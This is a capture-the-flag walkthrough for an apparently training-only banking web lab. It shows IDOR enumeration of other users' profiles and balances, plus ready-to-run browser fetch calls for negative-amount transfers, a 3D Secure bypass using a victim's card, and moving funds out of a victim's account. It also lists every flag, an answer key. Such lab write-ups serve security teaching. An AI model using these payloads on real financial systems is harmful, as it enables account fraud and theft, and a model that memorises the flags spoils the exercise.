# Solution — 0x06 IDOR CyberBank

This document provides a full step-by-step walkthrough of how each flag was recovered, including all API calls, browser console commands, and the reasoning behind each step.

---

## Setup

All testing was performed from a Kali Linux machine with Firefox browser and DevTools open. The target application is hosted at `http://web0x06.hbtn`.

Log in to CyberBank with your provided credentials and navigate to `http://web0x06.hbtn/dashboard`. Open DevTools (F12) and go to the **Network** tab.

---

## Flag 0 — Uncovering User IDs

### Objective
Find another user's customer ID and access their profile to retrieve the flag.

### Step 1 — Discover your own customer ID

Navigate to the dashboard and observe the `me` request in the Network tab, or visit directly:

```
http://web0x06.hbtn/api/customer/info/me
```

Response includes your `id` field — this is your `customer_id` and reveals the identifier format used across the API.

### Step 2 — Enumerate contacts to find other user IDs

The contacts list is loaded automatically on the dashboard. In DevTools Network tab, find the `contacts` GET request, or watch the full unfiltered Network log on dashboard load. Each contact object contains an `id` field — this is the other user's `customer_id`.

### Step 3 — Access another user's profile

Take a contact's `id` (e.g. Linda Robinson's) and substitute it in the customer info endpoint:

```
http://web0x06.hbtn/api/customer/info/<contact_id>
```

### Step 4 — Read the flag

The response JSON contains a `flag_0` field at the top level alongside `message`.

```bash
echo "175af81d6cbfdb5408df2c5e99256d47" > 0-flag.txt
```

---

## Flag 1 — Account Balance Disclosure

### Objective
Use the customer ID from Flag 0 to enumerate account numbers and disclose another user's account balance.

### Step 1 — Get target's account IDs

From the customer info response obtained in Flag 0, the `message.accounts_id` array contains the target user's account IDs.

### Step 2 — Access the account info endpoint

```
http://web0x06.hbtn/api/accounts/info/<account_id>
```

Replace `<account_id>` with the target user's account ID obtained in Step 1. Copy the exact value from the JSON response to avoid transcription errors.

### Step 3 — Read the flag

The response contains a `flag_1` field at the top level alongside `message`.

```bash
echo "7b5fabc7a93a26828dee6f6e849cc98a" > 1-flag.txt
```

---

## Flag 2 — Wire Transfer Balance Manipulation

### Objective
Exploit a missing sign-validation check in the wire transfer endpoint to inflate your account balance over $10,000, which triggers `flag_2` in the customer profile response.

### Step 1 — Capture the transfer request format

In the dashboard, open DevTools Network (filter: `accounts`), initiate a small transfer via the Quick Transfer UI (e.g. $1 to any contact), and click Confirm. The transfer fires as:

```
POST /api/accounts/transfer_to/<destination_account_id>
```

Right-click the POST request → **Copy → Copy as Fetch** to get the exact request structure.

### Step 2 — Replay with a negative amount via browser console

Open the browser Console tab and run the copied fetch, modifying only the `amount` field to a large negative number:

```javascript
await fetch("http://web0x06.hbtn/api/accounts/transfer_to/<any_account_id>", {
    "credentials": "include",
    "headers": { "Content-Type": "application/json" },
    "referrer": "http://web0x06.hbtn/dashboard",
    "body": JSON.stringify({
        "amount": -8000,
        "raison": "same",
        "account_id": "<your_account_id>",
        "routing": "<your_routing>",
        "number": "<your_account_number>"
    }),
    "method": "POST",
    "mode": "cors"
}).then(r => r.json()).then(console.log);
```

The server subtracts the negative amount from your balance (i.e. adds funds) without validating the sign.

### Step 3 — Verify balance and retrieve flag

Check your updated customer profile:

```
http://web0x06.hbtn/api/customer/info/me
```

Once `total_balance` exceeds 10,000, the response includes a `flag_2` field.

```bash
echo "76f1adfcc0caa788a70603fa2c6408a2" > 2-flag.txt
```

---

## Flag 3 — 3D Secure Bypass

### Objective
Initiate a payment using another user's card details, then confirm it using your own valid OTP — exploiting the fact that the confirmation endpoint does not validate that the OTP belongs to the same card or transaction.

### Step 1 — Obtain your own card details

Get your current account info to find your card ID:

```
http://web0x06.hbtn/api/accounts/info/<your_account_id>
```

Then get your card details:

```
http://web0x06.hbtn/api/cards/info/<your_card_id>
```

Note your card `number`, `cvv`, `e_month`, `e_year`.

### Step 2 — Obtain victim's card details

From the contacts list, get a contact's account IDs. Then:

```
http://web0x06.hbtn/api/accounts/info/<victim_account_id>
```

Retrieve the victim's `cards_id`, then:

```
http://web0x06.hbtn/api/cards/info/<victim_card_id>
```

Note the victim's card `number`, `cvv`, `e_month`, `e_year`.

### Step 3 — Start a normal payment with your own card

Navigate to `http://web0x06.hbtn/upgrade` with DevTools Network open (filter: All). Select your working card, fill in Zip Code (`10001`), click **Upgrade My Plan**.

When the OTP popup appears, check the GET request that auto-fired — its response contains your OTP:

```
GET /api/cards/3dsecure/<your_card_id>
Response: {"message":{"OTP":"74799","cvv":"735"},"status":"success"}
```

Note your OTP. **Do not click Confirm yet.**

### Step 4 — Initiate payment with victim's card

While the OTP popup is still open, open the Console tab and run:

```javascript
await fetch("http://web0x06.hbtn/api/cards/init_payment", {
    "credentials": "include",
    "headers": { "Content-Type": "application/json" },
    "body": JSON.stringify({
        "amount": 9.99,
        "cvv": "<victim_cvv>",
        "e_month": "<victim_e_month>",
        "e_year": "<victim_e_year>",
        "firstname": "<victim_firstname>",
        "lastname": "<victim_lastname>",
        "number": "<victim_card_number>"
    }),
    "method": "POST",
    "mode": "cors"
}).then(r => r.json()).then(console.log);
```

Note the `transaction_id` returned — this is the victim's pending payment transaction.

### Step 5 — Confirm victim's transaction using your OTP

Submit your valid OTP against the victim's `transaction_id`:

```javascript
await fetch("http://web0x06.hbtn/api/cards/confirm_payment/<victim_transaction_id>", {
    "credentials": "include",
    "headers": { "Content-Type": "application/json" },
    "body": JSON.stringify({
        "otp": "<your_otp>",
        "number": "<your_card_number>"
    }),
    "method": "POST",
    "mode": "cors"
}).then(r => r.json()).then(console.log);
```

### Step 6 — Read the flag

The response contains a `flag_3` field alongside the confirmed transaction details.

```bash
echo "1ea8f6bbd437fafad6ac708a1719f582" > 3-flag.txt
```

---

## Additional Vulnerabilities Discovered

### OTP Exposed in API Response
The `GET /api/cards/3dsecure/<card_id>` endpoint returns the OTP in plaintext in the response body. This completely defeats the purpose of one-time password authentication.

```
GET /api/cards/3dsecure/<card_id>
Response: {"message":{"OTP":"74799","cvv":"735"},"status":"success"}
```

### CVV Stored and Returned in Plaintext
The `GET /api/cards/info/<card_id>` endpoint returns the card CVV in the response. PCI DSS prohibits storing or returning CVV codes after authorization.

### Source Account Not Validated in Wire Transfers
The `account_id` field in the wire transfer request body identifies the source account but is never validated against the authenticated session. Any account ID can be used as the source:

```javascript
// Transfer FROM victim's account TO yours
await fetch("http://web0x06.hbtn/api/accounts/transfer_to/<your_account_id>", {
    "credentials": "include",
    "headers": { "Content-Type": "application/json" },
    "body": JSON.stringify({
        "amount": 500,
        "raison": "same",
        "account_id": "<victim_account_id>",
        "routing": "<victim_routing>",
        "number": "<victim_account_number>"
    }),
    "method": "POST",
    "mode": "cors"
}).then(r => r.json()).then(console.log);
```

### No TLS
All communication is over plain HTTP. Credentials, session cookies, card numbers, and OTPs are transmitted in cleartext.

### No Rate Limiting
No throttling exists on any financial endpoint, enabling high-speed enumeration and bulk exploitation.

---

## Summary of Flags

| Task | Flag |
|------|------|
| 0 — User ID enumeration | `175af81d6cbfdb5408df2c5e99256d47` |
| 1 — Account balance disclosure | `7b5fabc7a93a26828dee6f6e849cc98a` |
| 2 — Wire transfer manipulation | `76f1adfcc0caa788a70603fa2c6408a2` |
| 3 — 3D Secure bypass | `1ea8f6bbd437fafad6ac708a1719f582` |
